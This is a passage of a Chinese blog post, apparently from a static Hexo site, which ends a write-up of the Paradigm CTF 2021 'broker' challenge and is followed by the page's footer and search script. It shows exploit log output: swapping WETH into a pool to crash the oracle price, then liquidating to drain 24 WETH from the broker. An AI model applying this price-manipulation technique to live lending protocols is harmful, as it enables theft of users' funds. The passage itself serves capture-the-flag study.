+<p>输出结果：一开始的25WETH是自己存的，后面的24WETH是broker发给我的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Logs:</span><br><span class="line">  ==========before attack=========</span><br><span class="line">  the pool</span><br><span class="line">     reserve0_WETH_before 25000000000000000000</span><br><span class="line">     reserve1_Ltoken_before 500000000000000000000000</span><br><span class="line">  My asset</span><br><span class="line">     WETH 25000000000000000000</span><br><span class="line">     Ltoken 0</span><br><span class="line">  WETH price 20000</span><br><span class="line">  liquidate<span class="string">&#x27;s WETH price 15000</span></span><br><span class="line"><span class="string">  broker&#x27;</span>s WETH 25000000000000000000</span><br><span class="line"></span><br><span class="line">  ======after swap 25WETH <span class="keyword">for</span> Ltoken======</span><br><span class="line">  the pool</span><br><span class="line">     reserve0_WETH_after 50000000000000000000</span><br><span class="line">     reserve1_Ltoken_after 250375563345017526289435</span><br><span class="line">  My asset</span><br><span class="line">     WETH 0</span><br><span class="line">     Ltoken 249624436654982473710565</span><br><span class="line">  WETH price 5007</span><br><span class="line">  broker<span class="string">&#x27;s WETH 25000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  ==========after liquidate=========</span></span><br><span class="line"><span class="string">  the pool</span></span><br><span class="line"><span class="string">     reserve0_WETH_after 50000000000000000000</span></span><br><span class="line"><span class="string">     reserve1_Ltoken_after 250375563345017526289435</span></span><br><span class="line"><span class="string">  My asset</span></span><br><span class="line"><span class="string">     WETH 24000000000000000000</span></span><br><span class="line"><span class="string">     Ltoken 129456436654982473710565</span></span><br><span class="line"><span class="string">  WETH price 5007</span></span><br><span class="line"><span class="string">  broker&#x27;</span>s WETH 1000000000000000000</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/08/10/19.Paradigm%20CTF%202021/03.babycrypto/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-08-11 12:31:56
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/19-Paradigm-CTF-2021/" title="19.Paradigm CTF 2021">
+                        <b>#</b> 19.Paradigm CTF 2021
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/08/12/19.Paradigm%20CTF%202021/05.babysandbox/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#broker"><span class="toc-text">broker</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A8%E5%B1%80%E8%A7%82"><span class="toc-text">1.全局观</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%BB%E5%8A%A1"><span class="toc-text">2.任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-text">3.详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1%E8%B5%84%E4%BA%A7%E4%B8%8E%E6%B1%A0%E5%AD%90"><span class="toc-text">3.1资产与池子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%8E%98"><span class="toc-text">3.2漏洞发掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">3.3漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="toc-text">小插曲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 04.broker + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F08%2F11%2F19.Paradigm%2520CTF%25202021%2F04.broker%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/08/11/19.Paradigm%20CTF%202021/04.broker/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
